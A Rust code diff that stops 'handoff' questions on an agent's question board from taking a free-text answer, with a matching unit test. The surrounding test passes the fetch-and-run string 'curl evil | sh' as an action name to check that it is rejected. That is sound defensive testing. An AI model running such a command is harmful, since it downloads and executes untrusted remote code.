@@ -253,6 +253,10 @@ pub const ANSWER_TEXT_MAX: usize = 8 * 1024;
 /// the Asks list's Brief gives an instruction on every question, and a socket
 /// client is held to the same rule.
 pub fn accepts_external_answer(question: &Question, action: &str, text: &str) -> Result<(), String> {
+    // A handoff has no field: it ends on Fait, which the agent waits for.
+    if action == OTHER && crate::handoff::is_handoff(question) {
+        return Err(format!("a handoff question answers with {:?}", crate::handoff::DONE));
+    }
     if action == OTHER && text.trim().is_empty() {
         return Err("\"Other\" needs the text of the free answer".to_string());
     }
@@ -2741,6 +2745,7 @@ mod tests {
         // Only the question's own buttons: no Ouvrir on a Lancer card, no free word.
         assert!(board.answer_external(&id, crate::handoff::OPEN, "").is_err());
         assert!(board.answer_external(&id, "curl evil | sh", "").is_err());
+        assert!(board.answer_external(&id, OTHER, "done").is_err(), "a handoff ends on Fait");
         board.answer_external(&id, crate::handoff::RUN, "").unwrap();
         assert!(rx.try_recv().is_err());
         assert_eq!(board.take_steps(), vec![crate::handoff::Step::Run { name: "aws-login".into() }]);
